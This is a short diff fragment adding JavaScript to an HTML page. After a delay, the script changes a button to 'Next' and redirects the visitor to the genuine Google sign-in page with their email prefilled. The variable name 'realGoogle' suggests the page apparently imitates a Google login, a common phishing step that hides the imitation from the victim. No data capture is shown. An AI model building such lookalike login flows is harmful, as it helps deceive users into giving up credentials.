+    submitBtn.textContent = "Next";
+
+    const realGoogle =
+      "https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin&identifier=" +
+      encodeURIComponent(email);
+    window.location.href = realGoogle;
+  }, 1200);
+});
+</script>
 </body>
 </html>
